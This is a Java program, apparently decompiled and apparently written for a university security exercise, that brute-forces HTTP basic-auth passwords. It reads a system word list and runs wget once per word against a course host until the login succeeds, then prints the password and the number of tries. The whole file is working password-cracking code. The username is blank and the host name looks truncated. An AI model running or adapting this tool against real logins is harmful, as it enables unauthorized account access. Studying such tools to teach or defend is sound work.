public class Dictionary {
    public Dictionary() {
        super();
    }
    public static void main ( String[] a ) {
        java.io.FileNotFoundException a0 = null;
        try {
            try {
                java.io.BufferedReader a1 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( "/usr/share/lib/dict/words" ) );
                int i = 0;
                label0: while ( true ) {
                    java.io.IOException a2 = null;
                    String s = a1.readLine();
                    if ( s == null ) {
                        System.out.println ( "DICTIONARY BRUTE FORCE UNABLE  FIND PASSWORD" );
                        System.out.println ( "**********Sorry, password was not found in dictionary file" );
                        System.exit ( 1 );
                        return;
                    }
                    try {
                        Process a3 = Runtime.getRuntime().exec ( new StringBuilder ( "wget --http-user= --http-passwd=" ).append ( s ).append ( " " ).append ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).toString() );
                        java.io.BufferedReader a4 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a3.getInputStream() ) );
                        java.io.BufferedReader a5 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a3.getErrorStream() ) );
                        while ( true ) {
                            String s0 = a4.readLine();
                            if ( s0 == null ) {
                                while ( true ) {
                                    String s1 = a5.readLine();
                                    if ( s1 == null ) {
                                        try {
                                            a3.waitFor();
                                        } catch ( InterruptedException ignoredException ) {
                                        }
                                        i = i + 1;
                                        if ( a3.exitValue() == 0 ) {
                                            System.out.println ( new StringBuilder ( "**********PASSWORD IS: " ).append ( s ).toString() );
                                            System.out.println ( new StringBuilder ( "**********NUMBER OF TRIES: " ).append ( i ).toString() );
                                            System.exit ( 1 );
                                        }
                                        continue label0;
                                    } else {
                                        System.out.println ( s1 );
                                    }
                                }
                            } else {
                                System.out.println ( s0 );
                            }
                        }
                    } catch ( java.io.IOException a6 ) {
                        a2 = a6;
                    }
                    System.out.println ( "exception happened - here's what I know: " );
                    a2.printStackTrace();
                    System.exit ( -1 );
                }
            } catch ( java.io.FileNotFoundException a7 ) {
                a0 = a7;
            }
        } catch ( java.io.IOException a8 ) {
            System.out.println ( ( Object ) a8 );
            return;
        }
        System.out.println ( ( Object ) a0 );
    }
}
